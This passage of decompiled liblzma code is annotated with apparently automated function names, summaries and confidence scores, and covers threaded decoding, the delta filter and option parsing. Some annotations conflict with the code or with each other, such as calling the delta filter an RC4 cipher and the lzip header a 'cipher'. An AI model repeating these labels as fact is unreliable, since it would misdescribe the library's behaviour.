        lzma_filters_free(param_1 + 0x58,*(undefined8 *)(param_1 + 10));
        pthread_mutex_destroy(__mutex);
        pthread_cond_destroy(__cond);
        lzma_next_coder_end(param_1 + 0x10,*(undefined8 *)(param_1 + 10));
        lzma_free(*(undefined8 *)(param_1 + 2),*(undefined8 *)(param_1 + 10));
        if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
          return 0;
        }
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
LAB_0010cb95:
      pthread_mutex_lock(__mutex);
      if (*param_1 != 4) {
        *param_1 = 0;
        pthread_cond_signal(__cond);
      }
      pthread_mutex_unlock(__mutex);
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 8) + 0x1d8));
      lVar7 = *(long *)(param_1 + 6);
    }
    lVar8 = *(long *)(param_1 + 8);
    *(long *)(lVar8 + 0x1c8) = *(long *)(lVar8 + 0x1c8) + *(long *)(lVar7 + 0x38);
    uVar6 = *(undefined8 *)(lVar8 + 0x1b8);
    *(long *)(lVar8 + 0x1d0) = *(long *)(lVar8 + 0x1d0) + local_50;
    param_1[0xc] = 0;
    param_1[0xd] = 0;
    param_1[0xe] = 0;
    param_1[0xf] = 0;
    *(undefined8 *)(param_1 + 0x6c) = uVar6;
    *(uint **)(lVar8 + 0x1b8) = param_1;
    pthread_cond_signal((pthread_cond_t *)(lVar8 + 0x200));
    pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 8) + 0x1d8));
  } while( true );
}



/**
 * @name  lzma_mt_decoder_signal_workers
 * @brief Signals MT decoder worker threads to stop (state 3), optionally waits for completion via condition variables.
 * @confidence 75%
 * @classification handler
 * @address 0x0010cf40
 */

/* Signals worker threads to stop (sets state to 3) and optionally waits for completion. Uses mutex
   and condition variable synchronization to coordinate with thread pool. */

void signal_and_wait_worker_threads(long param_1,char param_2)

{
  int iVar1;
  undefined4 *puVar2;
  long lVar3;
  ulong uVar4;
  int *piVar5;
  uint uVar6;
  
  if (*(int *)(param_1 + 0x1b4) != 0) {
    uVar4 = 0;
    do {
      uVar6 = (int)uVar4 + 1;
      lVar3 = uVar4 * 0x220;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x1a8) + lVar3 + 0x1b8));
      puVar2 = (undefined4 *)(*(long *)(param_1 + 0x1a8) + lVar3);
      *puVar2 = 3;
      pthread_cond_signal((pthread_cond_t *)(puVar2 + 0x78));
      pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0x1a8) + lVar3 + 0x1b8));
      uVar4 = (ulong)uVar6;
    } while (uVar6 < *(uint *)(param_1 + 0x1b4));
    if ((param_2 != '\0') && (*(uint *)(param_1 + 0x1b4) != 0)) {
      uVar4 = 0;
      do {
        lVar3 = uVar4 * 0x220;
        pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0x1a8) + lVar3 + 0x1b8));
        piVar5 = (int *)(*(long *)(param_1 + 0x1a8) + lVar3);
        iVar1 = *piVar5;
        while (iVar1 != 0) {
          pthread_cond_wait((pthread_cond_t *)(piVar5 + 0x78),(pthread_mutex_t *)(piVar5 + 0x6e));
          piVar5 = (int *)(*(long *)(param_1 + 0x1a8) + lVar3);
          iVar1 = *piVar5;
        }
        uVar6 = (int)uVar4 + 1;
        uVar4 = (ulong)uVar6;
        pthread_mutex_unlock((pthread_mutex_t *)(piVar5 + 0x6e));
      } while (uVar6 < *(uint *)(param_1 + 0x1b4));
    }
    return;
  }
  return;
}



/**
 * @name  lzma_simple_coder_decode
 * @brief Simple filter decode process: invokes size calculator, calls inner decoder, applies bitwise NOT to output byte.
 * @confidence 68%
 * @classification handler
 * @address 0x0010e3a0
 */

/* Processes filter decoding with state machine, invokes decompression function pointer at
   param_1[3], applies bitwise NOT to output byte on success */

undefined8
lzma_filter_decode_process
          (undefined8 *param_1,undefined8 param_2,undefined8 param_3,long *param_4,
          undefined8 param_5,long param_6,long *param_7,long param_8,undefined4 param_9)

{
  byte bVar1;
  long lVar2;
  long lVar3;
  int iVar4;
  undefined8 uVar5;
  long in_FS_OFFSET;
  long local_48;
  long local_40;
  
  lVar2 = *param_7;
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  lVar3 = *param_4;
  iVar4 = (*(code *)param_1[9])(*param_1,&local_48,param_8 - lVar2);
  if (iVar4 == 0) {
    uVar5 = (*(code *)param_1[3])
                      (*param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
    if ((int)uVar5 == 1) {
      bVar1 = *(byte *)(param_1 + 10);
      *param_4 = lVar3 + local_48;
      *(byte *)(param_6 + lVar2) = ~bVar1;
      goto LAB_0010e440;
    }
    if ((int)uVar5 != 0) goto LAB_0010e440;
  }
  uVar5 = 0xb;
LAB_0010e440:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar5;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_auto_decoder_code
 * @brief Auto-detect decoder state machine: reads header byte (0xFD=xz, 'L'=lzip, other=alone), initializes appropriate decoder, then delegates.
 * @confidence 78%
 * @classification handler
 * @address 0x0010eca0
 */

/* State machine for LZMA stream decoding. State 0: reads a header byte to determine filter type
   (0xFD=BCJ filter, 'L'=cipher, other=generic), initializes appropriate decoder. State 1: calls the
   initialized decoder's process function. State 2: checks for trailing data. Returns LZMA error
   codes. */

ulong lzma_stream_decoder_process
                (undefined8 *param_1,undefined8 param_2,long param_3,ulong *param_4,ulong param_5,
                undefined8 param_6,undefined8 param_7,undefined8 param_8,int param_9)

{
  char cVar1;
  int iVar2;
  ulong uVar3;
  uint uVar4;
  
  iVar2 = *(int *)((long)param_1 + 0x5c);
  if (iVar2 != 1) {
    if (iVar2 == 2) goto LAB_0010ed7e;
    if (iVar2 != 0) {
      return 0xb;
    }
    if (param_5 <= *param_4) {
      return 0;
    }
    cVar1 = *(char *)(param_3 + *param_4);
    *(undefined4 *)((long)param_1 + 0x5c) = 1;
    if (cVar1 == -3) {
      uVar3 = lzma_stream_decoder_init(param_1,param_2,param_1[10],*(undefined4 *)(param_1 + 0xb));
      uVar4 = (uint)uVar3;
    }
    else if (cVar1 == 'L') {
      uVar3 = cipher_context_init();
      uVar4 = (uint)uVar3;
    }
    else {
      uVar3 = lzma2_decoder_init();
      if ((int)uVar3 != 0) {
        return uVar3;
      }
      if ((*(uint *)(param_1 + 0xb) & 1) != 0) {
        return 2;
      }
      uVar4 = *(uint *)(param_1 + 0xb) & 4;
      uVar3 = 4;
    }
    if (uVar4 != 0) {
      return uVar3;
    }
  }
  uVar3 = (*(code *)param_1[3])
                    (*param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
  if ((int)uVar3 != 1) {
    return uVar3;
  }
  if ((*(byte *)(param_1 + 0xb) & 8) == 0) {
    return uVar3;
  }
  *(undefined4 *)((long)param_1 + 0x5c) = 2;
LAB_0010ed7e:
  if (*param_4 < param_5) {
    return 9;
  }
  return (ulong)(param_9 == 3);
}



/**
 * @name  lzma_worker_signal_finish
 * @brief Thread-safe: locks mutex at +400, sets flag at +0x58, signals condvar at +0x1b8
 * @confidence 80%
 * @classification handler
 * @address 0x00112280
 */

/* Thread-safe signal: sets flag=1 and signals condition variable */

void lzma_worker_signal_finish(long param_1)

{
  pthread_mutex_lock((pthread_mutex_t *)(param_1 + 400));
  *(undefined4 *)(param_1 + 0x58) = 1;
  pthread_cond_signal((pthread_cond_t *)(param_1 + 0x1b8));
  pthread_mutex_unlock((pthread_mutex_t *)(param_1 + 400));
  return;
}



/**
 * @name  lzma_mt_worker_finish_item
 * @brief Completes a worker item: updates memory accounting fields, moves worker to free list, signals condition variable.
 * @confidence 75%
 * @classification handler
 * @address 0x001122c0
 */

/* Completes worker item, updates accounting, signals condition variable */

void lzma_mt_worker_finish_item(long param_1)

{
  long lVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  
  lVar1 = *(long *)(param_1 + 0x30);
  lVar2 = *(long *)(param_1 + 0x180);
  lVar3 = *(long *)(lVar1 + 0x2a0);
  lVar4 = *(long *)(param_1 + 0x10);
  *(undefined8 *)(param_1 + 0x10) = 0;
  *(long *)(lVar1 + 0x2a8) = *(long *)(lVar1 + 0x2a8) + lVar2;
  *(long *)(lVar1 + 0x2a0) = (lVar3 - lVar4) - lVar2;
  *(undefined8 *)(param_1 + 0x188) = *(undefined8 *)(lVar1 + 0x1d8);
  *(long *)(lVar1 + 0x1d8) = param_1;
  pthread_cond_signal((pthread_cond_t *)(lVar1 + 0x250));
  return;
}



/**
 * @name  lzma_mt_decoder_worker_thread
 * @brief Multi-threaded decoder worker thread function. Waits for work via condition variables, processes decode chunks in 0x4000-byte segments, signals completion to coordinator, handles error states and thread cleanup.
 * @confidence 75%
 * @classification handler
 * @address 0x00112310
 */

undefined8 FUN_00112310(int *param_1)

{
  pthread_mutex_t *__mutex;
  int iVar1;
  long lVar2;
  long lVar3;
  long lVar4;
  int iVar5;
  long lVar6;
  
  __mutex = (pthread_mutex_t *)(param_1 + 100);
LAB_00112340:
  pthread_mutex_lock(__mutex);
  iVar1 = *param_1;
  do {
    if (iVar1 != 0) {
      if (iVar1 == 3) {
        pthread_mutex_unlock(__mutex);
        lzma_free(*(undefined8 *)(param_1 + 2),*(undefined8 *)(param_1 + 0xe));
        lzma_next_coder_end(param_1 + 0x18,*(undefined8 *)(param_1 + 0xe));
        pthread_mutex_destroy(__mutex);
        pthread_cond_destroy((pthread_cond_t *)(param_1 + 0x6e));
        return 0;
      }
      if (iVar1 == 2) {
        *param_1 = 0;
        pthread_mutex_unlock(__mutex);
        pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0xc) + 0x228));
        goto LAB_001123fe;
      }
      lVar6 = *(long *)(param_1 + 6);
      iVar1 = param_1[0x16];
      *(long *)(param_1 + 0x12) = *(long *)(param_1 + 8);
      *(undefined8 *)(param_1 + 0x14) = *(undefined8 *)(param_1 + 10);
      if ((*(long *)(param_1 + 8) != lVar6) || (iVar1 == 1)) break;
    }
    pthread_cond_wait((pthread_cond_t *)(param_1 + 0x6e),__mutex);
    iVar1 = *param_1;
  } while( true );
  pthread_mutex_unlock(__mutex);
  if (0x4000 < (ulong)(lVar6 - *(long *)(param_1 + 8))) {
    lVar6 = *(long *)(param_1 + 8) + 0x4000;
  }
  iVar5 = (**(code **)(param_1 + 0x1e))
                    (*(undefined8 *)(param_1 + 0x18),*(undefined8 *)(param_1 + 0xe),
                     *(undefined8 *)(param_1 + 2),param_1 + 8,lVar6,*(long *)(param_1 + 0x10) + 0x40
                     ,param_1 + 10,*(undefined8 *)(*(long *)(param_1 + 0x10) + 0x10),0);
  if (iVar5 == 0) {
    if (iVar1 != 0) {
      param_1[0x16] = 2;
      pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0xc) + 0x228));
      lVar6 = *(long *)(param_1 + 0x10);
      *(undefined8 *)(lVar6 + 0x18) = *(undefined8 *)(param_1 + 10);
      *(undefined8 *)(lVar6 + 0x20) = *(undefined8 *)(param_1 + 8);
      pthread_cond_signal((pthread_cond_t *)(*(long *)(param_1 + 0xc) + 0x250));
      pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0xc) + 0x228));
    }
  }
  else {
    lzma_free(*(undefined8 *)(param_1 + 2),*(undefined8 *)(param_1 + 0xe));
    param_1[2] = 0;
    param_1[3] = 0;
    pthread_mutex_lock(__mutex);
    if (*param_1 != 3) {
      *param_1 = 0;
    }
    pthread_mutex_unlock(__mutex);
    pthread_mutex_lock((pthread_mutex_t *)(*(long *)(param_1 + 0xc) + 0x228));
    lVar6 = *(long *)(param_1 + 0xc);
    lVar2 = *(long *)(param_1 + 8);
    lVar3 = *(long *)(param_1 + 10);
    lVar4 = *(long *)(param_1 + 0x10);
    *(long *)(lVar6 + 0x2c8) = *(long *)(lVar6 + 0x2c8) + lVar2;
    *(long *)(lVar6 + 0x2d0) = *(long *)(lVar6 + 0x2d0) + lVar3;
    param_1[0x12] = 0;
    param_1[0x13] = 0;
    param_1[0x14] = 0;
    param_1[0x15] = 0;
    *(long *)(lVar4 + 0x18) = lVar3;
    *(long *)(lVar4 + 0x20) = lVar2;
    *(undefined1 *)(lVar4 + 0x28) = 1;
    *(int *)(lVar4 + 0x2c) = iVar5;
    param_1[0x10] = 0;
    param_1[0x11] = 0;
    if ((iVar5 != 1) && (*(int *)(lVar6 + 0x1bc) == 0)) {
      *(int *)(lVar6 + 0x1bc) = iVar5;
    }
LAB_001123fe:
    lzma_mt_worker_finish_item(param_1);
    pthread_mutex_unlock((pthread_mutex_t *)(*(long *)(param_1 + 0xc) + 0x228));
  }
  goto LAB_00112340;
}



/**
 * @name  thread_pool_signal_workers
 * @brief Signals all worker threads to state 2 by iterating, locking per-worker mutex, setting state, and signaling condition variable.
 * @confidence 78%
 * @classification handler
 * @address 0x00112720
 */

/* Signals worker threads in thread pool. Iterates through workers, acquires per-worker mutex, sets
   state to 2, broadcasts condition variable, releases mutex. */

void thread_pool_signal_workers(uint *param_1,long *param_2)

{
  uint uVar1;
  ulong uVar2;
  int *piVar3;
  long lVar4;
  
  if (*param_1 != 0) {
    uVar2 = 0;
    do {
      lVar4 = uVar2 * 0x1f8;
      pthread_mutex_lock((pthread_mutex_t *)(*param_2 + lVar4 + 400));
      piVar3 = (int *)(*param_2 + lVar4);
      if (*piVar3 != 0) {
        *piVar3 = 2;
        pthread_cond_signal((pthread_cond_t *)(piVar3 + 0x6e));
        piVar3 = (int *)(*param_2 + lVar4);
      }
      uVar1 = (int)uVar2 + 1;
      uVar2 = (ulong)uVar1;
      pthread_mutex_unlock((pthread_mutex_t *)(piVar3 + 100));
    } while (uVar1 < *param_1);
    return;
  }
  return;
}



/**
 * @name  lzma_mt_decoder_threaded_loop
 * @brief Thread-safe decoder loop that processes input under mutex, waits for workers via pthread_cond_timedwait, manages thread pool coordination, signals workers when data is ready. Returns 0x65 on timeout.
 * @confidence 78%
 * @classification handler
 * @address 0x001127b0
 */

/* Thread-safe decoder loop that processes input under a mutex lock, waits for worker threads to
   produce output, and supports timeout-based waiting via pthread_cond_timedwait. Manages thread
   pool coordination, signals workers when data is ready, and handles timeout (returning 0x65) when
   no progress is made. */

int threaded_decode_loop
              (long param_1,undefined8 param_2,undefined8 param_3,long *param_4,long param_5,
              undefined1 *param_6,char param_7,timespec *param_8,char *param_9)

{
  pthread_mutex_t *__mutex;
  long lVar1;
  uint uVar2;
  clockid_t __clock_id;
  char cVar3;
  int iVar4;
  long lVar5;
  long lVar6;
  int iVar7;
  long in_FS_OFFSET;
  timespec local_58;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  __mutex = (pthread_mutex_t *)(param_1 + 0x228);
  pthread_mutex_lock(__mutex);
  lVar1 = param_1 + 0x1e8;
LAB_00112830:
  do {
    lVar5 = *param_4;
    while (iVar4 = FUN_00109d70(lVar1,param_2,param_3,param_4,param_5,0,0), iVar4 == 1) {
      lzma_outq_read_callback(lVar1,lzma_worker_signal_finish);
    }
    iVar7 = iVar4;
    if (iVar4 != 0) {
LAB_00112a9e:
      pthread_mutex_unlock(__mutex);
      if (iVar7 != 0x65) {
        thread_pool_signal_workers(param_1 + 0x1c8,param_1 + 0x1d0);
      }
      goto LAB_001129a9;
    }
    if ((*param_4 != lVar5) && (*param_4 == param_5)) {
      *(undefined1 *)(param_1 + 0x2df) = 1;
    }
    iVar7 = *(int *)(param_1 + 0x1bc);
    if (iVar7 != 0) {
      if (*(char *)(param_1 + 0x2dd) != '\0') goto LAB_00112a9e;
      *(undefined4 *)(param_1 + 0x1c0) = 0xb;
    }
    if ((((param_6 != (undefined1 *)0x0) &&
         (*(ulong *)(param_1 + 0x2c0) <=
          (ulong)(*(long *)(param_1 + 0x288) -
                 (*(long *)(param_1 + 0x210) + *(long *)(param_1 + 0x2a0))))) &&
        (*(uint *)(param_1 + 0x218) < *(uint *)(param_1 + 0x220))) &&
       ((*(uint *)(param_1 + 0x1c8) < *(uint *)(param_1 + 0x1c4) ||
        (*(long *)(param_1 + 0x1d8) != 0)))) {
      *param_6 = 1;
      goto LAB_0011299f;
    }
    if (((param_7 == '\0') || (*(int *)(param_1 + 0x218) == 0)) ||
       ((cVar3 = lzma_outq_has_output(lVar1), cVar3 != '\0' ||
        (((lVar5 = *(long *)(param_1 + 0x1e0), lVar5 != 0 && (*(int *)(lVar5 + 0x58) != 0)) &&
         (*(long *)(*(long *)(lVar5 + 0x40) + 0x20) == *(long *)(lVar5 + 0x18)))))))
    goto LAB_0011299f;
    uVar2 = *(uint *)(param_1 + 0x1b8);
    if (uVar2 != 0) break;
    pthread_cond_wait((pthread_cond_t *)(param_1 + 0x250),__mutex);
  } while( true );
  if (*param_9 == '\0') {
    *param_9 = '\x01';
    __clock_id = *(clockid_t *)(param_1 + 0x280);
    param_8->tv_sec = (ulong)uVar2 / 1000;
    param_8->tv_nsec = (ulong)((uVar2 % 1000) * 1000000);
    clock_gettime(__clock_id,&local_58);
    lVar5 = local_58.tv_nsec + param_8->tv_nsec;
    lVar6 = local_58.tv_sec + param_8->tv_sec;
    param_8->tv_sec = lVar6;
    if (lVar5 < 1000000000) {
      param_8->tv_nsec = lVar5;
    }
    else {
      param_8->tv_nsec = lVar5 - 1000000000;
      param_8->tv_sec = lVar6 + 1;
    }
  }
  iVar4 = pthread_cond_timedwait((pthread_cond_t *)(param_1 + 0x250),__mutex,param_8);
  if (iVar4 != 0) {
    iVar4 = 0x65;
LAB_0011299f:
    pthread_mutex_unlock(__mutex);
    iVar7 = iVar4;
LAB_001129a9:
    if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return iVar7;
  }
  goto LAB_00112830;
}



/**
 * @name  lzma_lzma_coder_code
 * @brief Applies LZMA coder step via function pointer at coder[3], then delegates to next coder
 * @confidence 75%
 * @classification handler
 * @address 0x00116c00
 */

/* Applies LZMA coder step via function pointer then delegates to handler */

undefined8
lzma_lzma_coder_code(undefined8 *param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  undefined8 uVar1;
  
  if ((code *)param_1[3] == (code *)0x0) {
    return 0xb;
  }
  uVar1 = (*(code *)param_1[3])(*param_1,param_4);
  if ((int)uVar1 != 0) {
    return uVar1;
  }
  uVar1 = lzma_next_coder_code(param_1 + 0x14,param_2,param_4 + 0x10);
  return uVar1;
}



/**
 * @name  lzma_lzma2_decoder_code
 * @brief Two-stage buffered decoder: fills 0x1000-byte internal buffer from inner decoder, then decodes to output.
 * @confidence 72%
 * @classification handler
 * @address 0x00118380
 */

/* Processes data through a two-stage decoder with internal buffering. First stage fills an internal
   buffer (offset 0xc0, size 0x1000), second stage decodes from that buffer to output. Manages EOF
   flags at offsets 0xa8 and 0xa9. */

ulong buffered_decode_process
                (long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4,
                undefined8 param_5,undefined8 param_6,ulong *param_7,ulong param_8,
                undefined4 param_9)

{
  char cVar1;
  ulong uVar2;
  long lVar3;
  
  if (*(long *)(param_1 + 0x70) == 0) {
    uVar2 = lzma_buffered_decoder_process(param_1,param_3,param_4,param_5,param_6,param_7);
    return uVar2;
  }
  if (*param_7 < param_8) {
    do {
      lVar3 = *(long *)(param_1 + 0xb8);
      if ((*(char *)(param_1 + 0xa8) == '\0') && (*(long *)(param_1 + 0xb0) == lVar3)) {
        *(undefined8 *)(param_1 + 0xb0) = 0;
        *(undefined8 *)(param_1 + 0xb8) = 0;
        uVar2 = (**(code **)(param_1 + 0x70))
                          (*(undefined8 *)(param_1 + 0x58),param_2,param_3,param_4,param_5,
                           param_1 + 0xc0,param_1 + 0xb8,0x1000,param_9);
        if ((int)uVar2 == 1) {
          *(undefined1 *)(param_1 + 0xa8) = 1;
          lVar3 = *(long *)(param_1 + 0xb8);
          goto LAB_001183f9;
        }
        if ((int)uVar2 != 0) {
          return uVar2;
        }
        lVar3 = *(long *)(param_1 + 0xb8);
        if (lVar3 == 0) {
          return 0;
        }
        cVar1 = *(char *)(param_1 + 0xa9);
      }
      else {
LAB_001183f9:
        cVar1 = *(char *)(param_1 + 0xa9);
      }
      if (cVar1 != '\0') {
        if (lVar3 == 0) {
          return (ulong)*(byte *)(param_1 + 0xa8);
        }
        return 9;
      }
      uVar2 = lzma_buffered_decoder_process
                        (param_1,param_1 + 0xc0,param_1 + 0xb0,lVar3,param_6,param_7,param_8);
      if ((int)uVar2 == 1) {
        *(undefined1 *)(param_1 + 0xa9) = 1;
      }
      else {
        if ((int)uVar2 != 0) {
          return uVar2;
        }
        if (*(char *)(param_1 + 0xa8) != '\0') {
          if (param_8 <= *param_7) {
            return 0;
          }
          return 9;
        }
      }
    } while (*param_7 < param_8);
  }
  return 0;
}



/**
 * @name  lzma_lzma_encoder_filter_update
 * @brief Validates and updates LZMA encoder filter lc/lp/pb configuration from a filter pair structure.
 * @confidence 82%
 * @classification handler
 * @address 0x00120650
 */

/* Validates and updates LZMA encoder filter configuration from filter pair */

undefined8 lzma_lzma_encoder_filter_update(int *param_1,long param_2)

{
  uint uVar1;
  uint uVar2;
  long lVar3;
  
  lVar3 = *(long *)(param_2 + 8);
  if ((lVar3 == 0) || (*param_1 != 0)) {
    return 0xb;
  }
  uVar1 = *(uint *)(lVar3 + 0x14);
  if ((param_1[9] != uVar1) || (*(long *)(param_1 + 10) != *(long *)(lVar3 + 0x18))) {
    if ((4 < uVar1) ||
       (((uVar2 = *(uint *)(lVar3 + 0x18), 4 < uVar2 || (4 < uVar1 + uVar2)) ||
        (4 < *(uint *)(lVar3 + 0x1c))))) {
      return 8;
    }
    param_1[0xb] = *(uint *)(lVar3 + 0x1c);
    param_1[9] = uVar1;
    param_1[10] = uVar2;
    *(undefined2 *)(param_1 + 0x20) = 0x101;
  }
  return 0;
}



/**
 * @name  lzma_delta_decoder_code
 * @brief Stream cipher/delta decoder: XOR-subtracts values from 256-byte substitution table, supports callback and direct copy modes.
 * @confidence 65%
 * @classification handler
 * @address 0x001214b0
 */

/* Stream cipher decryption that processes data by XOR-subtracting values from a 256-byte
   substitution table at offset 0x59 in the context. Maintains a counter at offset 0x58
   (param_1+0xb). Has two paths: callback-based (param_1[3] != NULL) or direct copy mode. In direct
   mode, copies from input to output while decrypting. */

ulong stream_cipher_decrypt
                (undefined8 *param_1,undefined8 param_2,long param_3,long *param_4,long param_5,
                long param_6,long *param_7,long param_8,int param_9)

{
  char *pcVar1;
  byte bVar2;
  char cVar3;
  char cVar4;
  undefined8 uVar5;
  ulong uVar6;
  ulong uVar7;
  int iVar8;
  long lVar9;
  char *pcVar10;
  char *pcVar11;
  long lVar12;
  
  lVar12 = *param_7;
  if ((code *)param_1[3] != (code *)0x0) {
    uVar6 = (*(code *)param_1[3])(*param_1);
    lVar9 = *param_7 - lVar12;
    if (lVar9 != 0) {
      bVar2 = *(byte *)(param_1 + 0xb);
      pcVar1 = (char *)(param_6 + lVar12);
      uVar5 = param_1[10];
      pcVar10 = pcVar1;
      do {
        iVar8 = ((uint)bVar2 + (int)pcVar1) - (int)pcVar10;
        pcVar11 = pcVar10 + 1;
        cVar3 = *(char *)((long)param_1 + (ulong)(iVar8 + (int)uVar5 & 0xff) + 0x59);
        cVar4 = *pcVar10;
        *(char *)((long)param_1 + (ulong)(byte)iVar8 + 0x59) = cVar4;
        *pcVar10 = cVar4 - cVar3;
        pcVar10 = pcVar11;
      } while (pcVar1 + lVar9 != pcVar11);
      *(byte *)(param_1 + 0xb) = bVar2 - (char)lVar9;
    }
    return uVar6;
  }
  lVar9 = *param_4;
  uVar7 = param_8 - lVar12;
  uVar6 = param_5 - lVar9;
  if (uVar7 < (ulong)(param_5 - lVar9)) {
    uVar6 = uVar7;
  }
  if (uVar6 != 0) {
    uVar5 = param_1[10];
    bVar2 = *(byte *)(param_1 + 0xb);
    uVar7 = 0;
    do {
      iVar8 = (uint)bVar2 - (int)uVar7;
      cVar3 = *(char *)((long)param_1 + (ulong)(iVar8 + (int)uVar5 & 0xff) + 0x59);
      cVar4 = *(char *)(param_3 + lVar9 + uVar7);
      *(char *)((long)param_1 + (ulong)(byte)iVar8 + 0x59) = cVar4;
      *(char *)(param_6 + lVar12 + uVar7) = cVar4 - cVar3;
      uVar7 = uVar7 + 1;
    } while (uVar6 != uVar7);
    *(byte *)(param_1 + 0xb) = bVar2 - (char)uVar6;
    lVar9 = *param_4;
    lVar12 = *param_7;
  }
  *param_4 = lVar9 + uVar6;
  *param_7 = uVar6 + lVar12;
  return (ulong)((uint)CONCAT71((int7)(uVar7 >> 8),param_9 != 0) & (uint)(lVar9 + uVar6 == param_5))
  ;
}



/**
 * @name  lzma_delta_encoder_code
 * @brief Delta encoder processing: calls inner coder, then XOR-subtracts values from 256-byte substitution table (RC4-like KSA update).
 * @confidence 55%
 * @classification handler
 * @address 0x00121660
 */

/* Updates RC4 key scheduling algorithm state by swapping values in state array based on accumulator
   and index, implementing standard RC4 KSA permutation step. */

void rc4_ksa_update(undefined8 *param_1)

{
  char *pcVar1;
  byte bVar2;
  long lVar3;
  undefined8 uVar4;
  char cVar5;
  int iVar6;
  long lVar7;
  long in_R9;
  char *pcVar8;
  char *pcVar9;
  long *in_stack_00000008;
  
  lVar3 = *in_stack_00000008;
  (*(code *)param_1[3])(*param_1);
  lVar7 = *in_stack_00000008 - lVar3;
  if (lVar7 != 0) {
    bVar2 = *(byte *)(param_1 + 0xb);
    pcVar1 = (char *)(in_R9 + lVar3);
    uVar4 = param_1[10];
    pcVar8 = pcVar1;
    do {
      iVar6 = ((uint)bVar2 + (int)pcVar1) - (int)pcVar8;
      pcVar9 = pcVar8 + 1;
      cVar5 = *pcVar8 + *(char *)((long)param_1 + (ulong)(iVar6 + (int)uVar4 & 0xff) + 0x59);
      *pcVar8 = cVar5;
      *(char *)((long)param_1 + (ulong)(byte)iVar6 + 0x59) = cVar5;
      pcVar8 = pcVar9;
    } while (pcVar9 != pcVar1 + lVar7);
    *(byte *)(param_1 + 0xb) = bVar2 - (char)lVar7;
  }
  return;
}



/**
 * @name  lzma_simple_coder_code
 * @brief Processes one step of simple coder (BCJ filter wrapper). If no sub-coder, does buffer copy; otherwise delegates. Sets completion flag on LZMA_FINISH.
 * @confidence 72%
 * @classification handler
 * @address 0x001217c0
 */

/* Processes LZMA decoding step. If custom decoder function pointer is set, invokes it; otherwise
   uses buffer_copy_bounded. Sets completion flag when all input consumed in finish mode. */

undefined8
lzma_decode_process(undefined8 *param_1,undefined8 param_2,undefined8 param_3,long *param_4,
                   long param_5,undefined8 param_6,undefined8 param_7,undefined8 param_8,int param_9
                   )

{
  undefined8 uVar1;
  
  if ((code *)param_1[3] == (code *)0x0) {
    lzma_bufcpy(param_3,param_4,param_5,param_6,param_7,param_8);
    uVar1 = 0;
    if (((*(char *)((long)param_1 + 0x51) != '\0') && (param_9 == 3)) && (param_5 == *param_4)) {
      *(undefined1 *)(param_1 + 10) = 1;
      uVar1 = 0;
    }
  }
  else {
    uVar1 = (*(code *)param_1[3])
                      (*param_1,param_2,param_3,param_4,param_5,param_6,param_7,param_8,param_9);
    if ((int)uVar1 == 1) {
      *(undefined1 *)(param_1 + 10) = 1;
      uVar1 = 0;
    }
  }
  return uVar1;
}



/* ==================== Parsers ==================== */

/**
 * @name  parse_lzma_options_string
 * @brief Parses LZMA compression options from a comma-separated string of name=value pairs. Supports three value types: presets (digit + optional 'e' extreme flag), string enums (looked up from a name-value table), and integers with optional KiB/MiB/GiB suffixes. Validates ranges and stores parsed values into the options structure at descriptor-specified offsets. Returns NULL on success or a static error string on failure. Part of liblzma's lzma_str_to_filters implementation.
 * @confidence 88%
 * @classification parser
 * @address 0x001074e0
 */

/* Parses LZMA compression options from a comma-separated string of name=value pairs. Supports
   preset values (digit + optional 'e' extreme flag), string enum values, and integer values with
   optional KiB/MiB/GiB suffixes. Validates ranges per descriptor and stores parsed values into the
   options structure. Returns NULL on success or an error message on failure. */

char * parse_lzma_options_string
                 (undefined8 *param_1,char *param_2,long param_3,void *param_4,long param_5)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  char *pcVar4;
  void *pvVar5;
  char *pcVar6;
  sbyte sVar7;
  uint uVar8;
  void *__s2;
  char *pcVar9;
  char *pcVar10;
  size_t __n;
  ulong uVar11;
  
  if ((char *)*param_1 < param_2) {
    pcVar10 = (char *)*param_1;
    do {
      cVar1 = *pcVar10;
      if (cVar1 == '\0') {
        return (char *)0x0;
      }
      if (cVar1 == ',') {
        pcVar9 = pcVar10 + 1;
        *param_1 = pcVar9;
      }
      else {
        __n = (long)param_2 - (long)pcVar10;
        pcVar4 = memchr(pcVar10,0x2c,__n);
        pcVar9 = param_2;
        if (pcVar4 != (char *)0x0) {
          __n = (long)pcVar4 - (long)pcVar10;
          pcVar9 = pcVar4;
        }
        pvVar5 = memchr(pcVar10,0x3d,__n);
        if ((pvVar5 == (void *)0x0) || (cVar1 == '=')) {
          return "Options must be \'name=value\' pairs separated with commas";
        }
        uVar11 = (long)pvVar5 - (long)pcVar10;
        __s2 = param_4;
        if (0xb < uVar11) {
LAB_001075c3:
          return "Unknown option name";
        }
        while ((iVar2 = memcmp(pcVar10,__s2,uVar11), iVar2 != 0 ||
               (*(char *)((long)__s2 + uVar11) != '\0'))) {
          __s2 = (void *)((long)__s2 + 0x18);
          if (__s2 == (void *)((long)param_4 + param_5 * 0x18)) goto LAB_001075c3;
        }
        pcVar10 = (char *)((long)pvVar5 + 1);
        *param_1 = pcVar10;
        uVar11 = (long)pcVar9 - (long)pcVar10;
        if (uVar11 == 0) {
          return "Option value cannot be empty";
        }
        if (*(char *)((long)__s2 + 0xc) == '\x03') {
